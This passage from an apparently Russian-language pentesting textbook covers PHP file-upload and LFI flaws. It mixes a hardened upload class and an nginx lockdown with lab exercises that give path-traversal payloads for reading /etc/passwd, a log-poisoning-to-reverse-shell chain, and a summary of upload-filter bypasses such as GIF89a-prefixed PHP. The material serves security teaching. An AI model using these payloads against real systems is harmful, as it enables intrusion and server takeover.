        $destination = $this->upload_dir . $safe_name;
        
        if (!move_uploaded_file($file['tmp_name'], $destination)) {
            throw new \Exception("Не удалось сохранить файл");
        }
        
        // Дополнительно: ресайз изображений через GD
        // (уничтожает встроенные PHP-payload'ы в EXIF и т.д.)
        $this->resizeImage($destination);
        
        return $safe_name;
    }
    
    private function resizeImage(string $path): void {
        // Ресайз "очищает" изображение от встроенного кода!
        [$width, $height, $type] = getimagesize($path);
        
        if ($width > 2048 || $height > 2048) {
            // Ресайз при необходимости
            // ... ImageMagick или GD логика ...
        } else {
            // Пересохранить "чистое" изображение
            switch ($type) {
                case IMAGETYPE_JPEG:
                    $img = imagecreatefromjpeg($path);
                    imagejpeg($img, $path, 85);
                    imagedestroy($img);
                    break;
                case IMAGETYPE_PNG:
                    $img = imagecreatefrompng($path);
                    imagepng($img, $path);
                    imagedestroy($img);
                    break;
            }
        }
    }
}

// Использование:
$uploader = new SecureFileUpload();
$result = $uploader->handle($_FILES['photo']);

if ($result['success']) {
    echo "Успешно загружено: " . htmlspecialchars($result['path']);
} else {
    echo "Ошибка: " . htmlspecialchars($result['error']);
}
?>
```

### Конфигурация Nginx для защиты

```nginx
# /etc/nginx/conf.d/upload-security.conf

# Запрет выполнения PHP в директории uploads
location /uploads/ {
    # Полностью запрещаем выполнение PHP
    location ~* \.php$ {
        deny all;
        return 403;
    }
    
    # Разрешаем только статические файлы изображений
    location ~* \.(jpg|jpeg|png|gif|webp)$ {
        expires 30d;
        add_header Cache-Control "public, no-transform";
    }
    
    # Всё остальное — запрещено
    location / {
        deny all;
    }
}

# Content-Security-Policy для предотвращения XSS через SVG
add_header Content-Security-Policy "default-src 'self'; script-src 'self'";

# X-Content-Type-Options предотвращает MIME sniffing
add_header X-Content-Type-Options "nosniff";
```

---

## Практические упражнения

### Упражнение 1: PortSwigger Academy — File Upload Labs

```
Перейдите на portswigger.net/web-security/file-upload

ОБЯЗАТЕЛЬНЫЕ ЛАБОРАТОРНЫЕ:
  1. "Remote code execution via web shell upload"
     (загрузка без защиты — базовый кейс)

  2. "Web shell upload via Content-Type restriction bypass"
     (обход через MIME-тип)

  3. "Web shell upload via path traversal"
     (загрузка в безопасную папку → path traversal для запуска)

  4. "Web shell upload via obfuscated file extension"
     (обфускация расширения)

  5. "Remote code execution via polyglot web shell upload"
     (GIF + PHP polyglot)

Для каждой лаборатории:
  - Запустить Burp Suite
  - Попробовать базовую атаку (откажет)
  - Изучить что именно проверяет сервер
  - Применить обход из этой главы
  - Получить команду id → задокументировать
```

### Упражнение 2: Path Traversal — PortSwigger

```
portswigger.net/web-security/file-path-traversal

  1. "File path traversal, simple case"
     GET /image?filename=../../../etc/passwd

  2. "File path traversal, traversal sequences blocked with superfluous URL-decode"
     ..%252F..%252Fetc%252Fpasswd

  3. "File path traversal, validation of start of path"
     /var/www/html/../../../etc/passwd

  4. "File path traversal, validation of file extension with null byte bypass"
     ../../../etc/passwd%00.png
```

### Упражнение 3: Локальный стенд — LFI к RCE

Используя Docker-стенд из раздела 11.5.7:

1. Найти LFI в `view.php`
2. Прочитать `/etc/passwd` через path traversal
3. Отравить access.log через User-Agent
4. Выполнить команду `id` через log poisoning
5. Загрузить webshell через `upload.php` (обходя фильтр расширений)
6. Получить reverse shell

Всё задокументировать как пентест-отчёт.

### Упражнение 4: Написание защиты

На основе уязвимого кода из стенда:
1. Исправьте `upload.php` — добавьте все проверки из SecureFileUpload класса
2. Исправьте `view.php` — замените LFI на whitelist подход
3. Настройте `.htaccess` для папки uploads
4. Проверьте свои исправления, попытавшись атаковать свой же код

---

## Итоги главы

```
КЛЮЧЕВЫЕ ТЕХНИКИ FILE UPLOAD:
================================
• Обход MIME: Content-Type: image/jpeg при загрузке .php
• Двойное расширение: shell.php.jpg
• Magic bytes + PHP: GIF89a + <?php system(); ?>
• .htaccess: переопределить обработчик расширений
• EXIF injection: PHP в метаданных изображения

LFI → RCE ЦЕПОЧКИ:
  LFI + Log Poisoning → выполняем User-Agent
  LFI + /proc/self/environ → то же самое
  LFI + php://input wrapper → POST-тело как PHP
  LFI + data:// wrapper → инлайн PHP код
  LFI + Upload → читаем загруженный webshell

PHP-РАЗРАБОТЧИК:
  Ты знаешь include(), file_get_contents(), move_uploaded_file()
  Это понимание делает тебя эффективнее в поиске ЭТИХ уязвимостей
  в чужом коде — используй это на пентестах!
```

